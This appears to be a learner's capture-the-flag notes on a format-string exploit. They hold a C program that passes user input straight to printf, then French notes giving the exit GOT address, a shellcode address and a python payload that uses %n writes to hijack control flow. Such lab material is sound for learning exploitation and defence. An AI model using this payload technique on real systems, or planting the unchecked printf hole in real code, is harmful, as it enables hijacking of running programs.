#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int    main(void)
{
    int i = 0;
    char buff[100];

    fgets(buff, 100, stdin);
    while (i < strlen(buff))
    {
        // isupper(buff[i])
        if (buff[i] >= 64 && buff[i] <= 90)
            buff[i] = buff[i] ^ 32; // buff[i] = tolower(buff[i])
        i++;
    }
    printf(buff);
    exit(0);
}


adresse exit a remplacer 80497e0

0xffffd5e8



FFFFDF3E
adress shell code '\x3e\xdf\xff\xff'
                    57150   65535 >> 8385
4294958910 - 4  = 4294958906

python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57142x" + "%10$n" + "%8385x" + "%11$n"'